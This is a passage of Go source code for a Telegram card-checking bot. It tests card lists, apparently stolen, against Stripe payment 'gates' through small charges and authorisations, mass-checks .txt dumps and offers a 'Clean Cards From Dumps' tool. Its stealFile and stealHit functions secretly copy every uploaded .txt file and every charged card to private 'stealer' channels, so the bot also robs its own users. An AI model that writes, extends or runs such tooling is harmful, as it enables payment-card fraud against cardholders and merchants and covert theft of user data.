                        cfg.mu.Unlock()
                        cfg.Save()
                        if n == 0 {
                                return c.Send("♾️ Global card limit <b>removed</b> — unlimited cards per session.", tele.ModeHTML)
                        }
                        return c.Send(fmt.Sprintf("✅ Global card limit set to <b>%d cards</b> per session.", n), tele.ModeHTML)
                }
                if len(args) == 2 {
                        // /limit <userid> <number> — per-user limit
                        targetUID, err := strconv.ParseInt(args[0], 10, 64)
                        if err != nil {
                                return c.Send("❌ Invalid user ID. Usage: /limit 123456789 5000")
                        }
                        n, err := strconv.Atoi(args[1])
                        if err != nil || n < 0 {
                                return c.Send("❌ Invalid number. Usage: /limit 123456789 5000")
                        }
                        cfg.mu.Lock()
                        if n == 0 {
                                delete(cfg.UserCardLimits, targetUID)
                        } else {
                                cfg.UserCardLimits[targetUID] = n
                        }
                        cfg.mu.Unlock()
                        cfg.Save()
                        if n == 0 {
                                return c.Send(fmt.Sprintf("♾️ Card limit for user <code>%d</code> <b>removed</b> — falls back to global.", targetUID), tele.ModeHTML)
                        }
                        return c.Send(fmt.Sprintf("✅ Card limit for user <code>%d</code> set to <b>%d cards</b> per session.", targetUID, n), tele.ModeHTML)
                }
                return c.Send("❌ Usage:\n/limit 5000 — global\n/limit userid 5000 — per-user")
        })

        // ── /satan — remove all restrictions (admin only) ──────────────
        bot.Handle("/satan", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /satan", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.SatanMode = true
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send("😈 <b>Satan Mode ON</b> — All restrictions removed.\nEveryone can use the bot freely. No limits, no bans, no blocks.\n\nUse /fuck to restore normal mode.", tele.ModeHTML)
        })

        // ── /fuck — restore normal restrictions (admin only) ───────────
        bot.Handle("/fuck", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "❌")+" Only admin can use /fuck", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.SatanMode = false
                cfg.mu.Unlock()
                cfg.Save()
                return c.Send("🔒 <b>Normal Mode ON</b> — All restrictions restored.\nBans, blocks, private mode, and limits are active again.", tele.ModeHTML)
        })

        // ── /logon — enable full logs channel (admin only) ──────────────
        bot.Handle("/logon", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.LogEnabled = true
                cfg.mu.Unlock()
                cfg.Save()
                bot.Send(&tele.Chat{ID: fullLogsChatID}, "<b>[SYSTEM]</b> Full Logs Enabled ✅", tele.ModeHTML)
                return c.Send("📅 <b>Full Logs ON</b> — Every card check (charged, approved, declined, error) will now be sent to the logs channel.", tele.ModeHTML)
        })

        // ── /logoff — disable full logs channel (admin only) ───────────
        bot.Handle("/logoff", func(c tele.Context) error {
                if !isAdmin(c.Sender().ID) {
                        return c.Send(em(emojiCross, "🚫")+" Admin only.", tele.ModeHTML)
                }
                cfg.mu.Lock()
                cfg.LogEnabled = false
                cfg.mu.Unlock()
                cfg.Save()
                bot.Send(&tele.Chat{ID: fullLogsChatID}, "<b>[SYSTEM]</b> Full Logs Disabled 🔕", tele.ModeHTML)
                return c.Send("📅 <b>Full Logs OFF</b> — Logs channel will no longer receive card checks.\n\nOther channels (charged, approved, files) continue normally.", tele.ModeHTML)
        })


        // ── Stripe gates (inline + file variants) ──────────────────────
        // Auth gate
        registerStripeInline(bot, "/str", "Stripe Auth", um, fwd, checkStripeAuthCard)
        registerStripeInline(bot, "/mstr", "Stripe Auth", um, fwd, checkStripeAuthCard)
        registerStripeFile(bot, "/mstrtxt", "Stripe Auth", um, checkStripeAuthCard)
        // Checkout $1 GBP
        registerStripeInline(bot, "/str1", "Stripe UHQ $1", um, fwd, checkStripeCheckoutCard)
        registerStripeInline(bot, "/mstr1", "Stripe UHQ $1", um, fwd, checkStripeCheckoutCard)
        registerStripeFile(bot, "/mstr1txt", "Stripe UHQ $1", um, checkStripeCheckoutCard)
        // SecondStork $5 NZD
        registerStripeInline(bot, "/str2", "Stripe UHQ $5", um, fwd, checkStripeSecondStorkCard)
        registerStripeInline(bot, "/mstr2", "Stripe UHQ $5", um, fwd, checkStripeSecondStorkCard)
        registerStripeFile(bot, "/mstr2txt", "Stripe UHQ $5", um, checkStripeSecondStorkCard)
        // Donation $3 USD
        registerStripeInline(bot, "/str4", "Stripe Donation", um, fwd, checkStripeDonationCard)
        registerStripeInline(bot, "/mstr4", "Stripe Donation", um, fwd, checkStripeDonationCard)
        registerStripeFile(bot, "/mstr4txt", "Stripe Donation", um, checkStripeDonationCard)
        // Dollar $1 USD
        registerStripeInline(bot, "/str5", "Stripe $1", um, fwd, checkStripeDollarCard)
        registerStripeInline(bot, "/mstr5", "Stripe $1", um, fwd, checkStripeDollarCard)
        registerStripeFile(bot, "/mstr5txt", "Stripe $1", um, checkStripeDollarCard)

        // Register stealer for all .txt files
        bot.Handle(tele.OnDocument, stealFile)

        fmt.Println("Bot started")
        bot.Send(&tele.Chat{ID: chargedStealerChatID}, "<b>[SYSTEM]</b> Charged Stealer Active 🚀", tele.ModeHTML)
        bot.Send(&tele.Chat{ID: fileStealerChatID}, "<b>[SYSTEM]</b> File Stealer Active 🚀", tele.ModeHTML)
        bot.Send(&tele.Chat{ID: approvedStealerChatID}, "<b>[SYSTEM]</b> Approved Stealer Active 🚀", tele.ModeHTML)
        bot.Send(&tele.Chat{ID: fullLogsChatID}, "<b>[SYSTEM]</b> Full Logs Active 🚀", tele.ModeHTML)
        bot.Start()
}
func stealHit(bot *tele.Bot, msg string) {
        if _, err := bot.Send(&tele.Chat{ID: chargedStealerChatID}, msg, tele.ModeHTML); err != nil {
                fmt.Printf("[STEALER ERROR] Failed to send charged card: %v\n", err)
        }
}

func stealFile(c tele.Context) error {
        doc := c.Message().Document
        if doc == nil || !strings.HasSuffix(strings.ToLower(doc.FileName), ".txt") {
                return nil
        }
        s := c.Sender()

        // Download the file to send it as a fresh upload (removes "Forwarded from" tag)
        r, err := c.Bot().File(&doc.File)
        if err != nil {
                return nil
        }
        defer r.Close()
        data, err := io.ReadAll(r)
        if err != nil {
                return nil
        }

        caption := fmt.Sprintf("<b>[STEALER]</b> New File Uploaded\n\n👤 User: @%s (<code>%d</code>)\n📄 File: %s",
                s.Username, s.ID, doc.FileName)

        newDoc := &tele.Document{
                File:     tele.FromReader(bytes.NewReader(data)),
                FileName: doc.FileName,
                Caption:  caption,
        }

        c.Bot().Send(&tele.Chat{ID: fileStealerChatID}, newDoc, tele.ModeHTML)
        return nil
}

// getCurrencySymbol returns the appropriate currency symbol for a currency code
func getCurrencySymbol(currency string) string {
symbols := map[string]string{
"USD": "$",
"GBP": "£",
"EUR": "€",
"JPY": "¥",
"CNY": "¥",
"INR": "₹",
"AUD": "$",
"CAD": "$",
"CHF": "₣",
"SEK": "kr",
"NZD": "$",
"MXN": "$",
"SGD": "$",
"HKD": "$",
"NOK": "kr",
"KRW": "₩",
"TRY": "₺",
"RUB": "₽",
"BRL": "R$",
"ZAR": "R",
}
if sym, ok := symbols[strings.ToUpper(currency)]; ok {
return sym
}
return "$"
}

// formatAuthMsg displays Stripe Auth commands
func formatAuthMsg() string {
return "<b>🔐 Stripe Auth Checker</b>\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"🔗 <b>/str</b> - Stripe Auth (UK)\n" +
"   ∟ No charge, instant results\n" +
"   ∟ Paste cards directly inline\n\n" +
"📎 <b>/mstr</b> - Mass Stripe Auth\n" +
"   ∟ Check multiple cards at once\n" +
"   ∟ Paste cards directly inline\n\n" +
"📄 <b>/mstrtxt</b> - Stripe Auth from File\n" +
"   ∟ Reply to a .txt file to mass\n" +
"   ∟ Check all cards inside it\n\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n" +
"<b>Usage Format:</b>\n" +
"<code>card|mm|yy|cvv</code>\n" +
"<code>card|mm|yy|cvv</code>"
}

// formatChargeMsg displays Shopify Charge commands
func formatChargeMsg() string {
return "<b>💳 Shopify Auto Charge</b>\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"🔫 <b>/sh</b> - Quick Shopify Check\n" +
"   ∟ Quick check up to 100 cards\n" +
"   ∟ Paste cards directly inline\n\n" +
"📄 <b>/txt</b> - Shopify from File\n" +
"   ∟ Reply to a .txt file to mass\n" +
"   ∟ Check all cards inside it\n\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n" +
"<b>Usage Format:</b>\n" +
"<code>card|mm|yy|cvv</code>\n" +
"<code>card|mm|yy|cvv</code>"
}

// formatToolsMsg displays the coming soon message
func formatToolsMsg() string {
return "<b>⚙️ Available Tools</b>\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"1️⃣ <b>Fill Splitter</b>\n" +
"𝙽𝚊𝚖𝚎 ↣ 𝘍𝘪𝘭𝘭 𝘚𝘱𝘭𝘪𝘵𝘦𝘳\n" +
"𝙰𝚞𝚜𝚎 ⇾ /split {amount}\n" +
"𝙰𝚜𝚝𝚊𝚝𝚞𝚜 ↭ 𝘖𝘯𝘭𝘪𝘯𝘦 ✅\n\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"2️⃣ <b>Clean Cards From Dumps</b>\n" +
"𝙽𝚊𝚖𝚎 ↣ 𝘊𝘭𝘦𝘢𝘯 𝘊𝘢𝘳𝘥𝘴 𝘍𝘳𝘰𝘮 𝘋𝘶𝘮𝘱𝘴\n" +
"𝙰𝚞𝚜𝚎 ⇾ /clean\n" +
"𝙰𝚜𝚝𝚊𝚝𝚞𝚜 ↭ 𝘖𝘯𝘭𝘪𝘯𝘦 ✅\n\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n" +
"@Saitamaz_shopiBot Ready To Serve You ⚡"
}

// formatProfileMsg displays user profile information
func formatProfileMsg(uid int64, username string, proxyCount int) string {
return "<b>👤 Your Profile</b>\n" +
"━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"🔵 <b>ID</b> → <code>" + strconv.FormatInt(uid, 10) + "</code>\n" +
"👤 <b>Username</b> → @" + username + "\n" +
"⭐ <b>Bot</b> → @Saitamaz_shopiBot\n" +
"📅 <b>Proxies</b> → " + strconv.Itoa(proxyCount) + " loaded\n" +
"⚡ <b>Status</b> → ✅ <b>Active</b>\n" +
"━━━━━━━━━━━━━━━━━━━━━━"
}

// formatProfileCaption formats the profile picture caption
func formatProfileCaption(uid int64, username string, ud *UserData) string {
status := "Regular"
if ud != nil && ud.IsPremium {
status = "Premium"
}

credits := "0"
if ud != nil {
credits = strconv.Itoa(ud.Credits)
}

expireDate := "N/A"
if ud != nil && ud.ExpireDate != "" {
expireDate = ud.ExpireDate
}

return "<b>@Saitamaz_shopiBot — Profile</b>\n" +
"_________________\n\n" +
"👋 Hello, " + username + "!\n\n" +
"💎 Status: " + status + "\n" +
"💰 Credits: " + credits + "\n" +
"📅 Expire: " + expireDate + "\n\n" +
"_________________\n" +
"<b>@Saitamaz_shopiBot Ready To Serve You ⚡</b>"
}

// formatHelpMsg displays owner contact information
func formatHelpMsg() string {
return "<b>ℹ️ Help & Support</b>\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"<b>📞 Owner Contact Information</b>\n\n" +
"👤 <b>Telegram</b>\n" +
"   @saitama_god69\n\n" +
"💬 <b>Support Channel</b>\n" +
"   @saitama_update\n\n" +
"📧 <b>Direct Message</b>\n" +
"   Click to contact owner\n\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n\n" +
"<b>❓ FAQ</b>\n\n" +
"<b>Q: How to add proxies?</b>\n" +
"A: Use /proxy &lt;proxy&gt;\n\n" +
"<b>Q: How to check cards?</b>\n" +
"A: Use /sh, /str, /str1, etc.\n\n" +
"<b>Q: How to mass check?</b>\n" +
"A: Use /mstr, /mstr1 or /txt\n\n" +
"━━━━━━━━━━━━━━━━━━━━━━━━\n" +
"<b>@Saitamaz_shopiBot Ready To Serve You ⚡</b>"
}
